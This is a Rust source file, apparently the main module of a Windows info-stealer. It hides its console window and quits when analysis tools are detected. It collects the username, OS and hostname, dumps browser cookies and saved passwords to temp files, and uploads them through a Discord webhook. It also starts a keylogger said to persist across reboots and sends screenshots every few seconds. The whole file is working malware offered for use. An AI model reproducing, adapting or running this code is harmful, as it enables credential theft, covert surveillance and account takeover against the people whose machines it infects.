// Comment for debugging 
#![windows_subsystem = "windows"]

use anyhow::Result;
use keylogger::keylog_all;
use serenity::{
    http::Http,
    model::{
        channel::{AttachmentType, Embed},
        webhook::Webhook,
    },
};
use std::{env, fs, path::PathBuf, process, thread};
use sysinfo::{System, SystemExt};
use take_screenshots::run;

use antilysis; // Our crate at crate.io !

mod constants;
mod cookies;
mod keylogger;
mod utils;
mod take_screenshots;

use crate::utils::unwrap_string;

// Send elements to Discord servers with Discord Webhooks.
async fn send(data: Option<String>, files: Vec<PathBuf>) -> Result<()> {
    let http = Http::new("token");
    let url = constants::DISCORD_URL;

    // Create webhook.
    let webhook = Webhook::from_url(&http, url).await?;

    // Execute Webhook, add metadata, content and files.
    webhook
        .execute(&http, true, |w| {
            w.username("username");
            if let Some(data) = data {
                // Embed [data] in a discord message.
                let embed = Embed::fake(|e| {
                    e.title("System info");
                    e.description(data);
                    e
                });
                w.embeds(vec![embed]);
            }
            for file in &files {
                if file.exists() {
                    w.add_file(AttachmentType::Path(file));
                }
            }
            w
        })
        .await?;
    Ok(())
}

// Async main function, needs [tokio] crate to work, [futures] isn't enough.
#[tokio::main]
async fn main() {
    // Kill process if anti-analysis are present.
    if constants::ANTILYSIS && antilysis::detected() {
        process::exit(0);
    }

    // Get system info and store them in a String.
    let sys = System::new_all();
    let mut sysinfo = String::new();
    sysinfo.push_str(&format!(
        "Username:                {}\n",
        env::var_os("USERNAME").unwrap().into_string().unwrap()
    ));
    sysinfo.push_str(&format!(
        "System name:             {}\n",
        unwrap_string(sys.name())
    ));
    sysinfo.push_str(&format!(
        "System OS version:       {}\n",
        unwrap_string(sys.os_version())
    ));
    sysinfo.push_str(&format!(
        "System host name:        {}\n",
        unwrap_string(sys.host_name())
    ));

    // Create cookies files and write the cookies we get with [cookies.rs] in it.
    let cookies_file = env::temp_dir().join("cookies.txt");
    let cookies_strings = cookies::get_cookies().unwrap();
    fs::write(&cookies_file, cookies_strings.join("\n")).unwrap();

    // Create cookies files and write the passwords we get with [cookies.rs] in it.
    let passwords_file = env::temp_dir().join("passwords.txt");
    let passwords_strings = cookies::get_passwords().unwrap();
    fs::write(&passwords_file, passwords_strings.join("\n")).unwrap();

    let mut files = vec![cookies_file, passwords_file];

    if constants::KEYLOG {
        let logs = env::temp_dir().join("logs.txt");
        files.push(logs);
    }

    // Send system info, cookies, passwords and logs (if present, they aren't after first run) to Discord server.
    send(Some(sysinfo), files).await;

    if constants::KEYLOG {
        thread::spawn(|| {
            // Start keylogging to [logs.txt], ends at shutdown and restarts at reboot (thanks to the injector)
            keylog_all();
        });
    }

    // take a screenshot every and send it every 5 seconds
    if constants::SCREENSHOTS {
        run().await;
    }
}
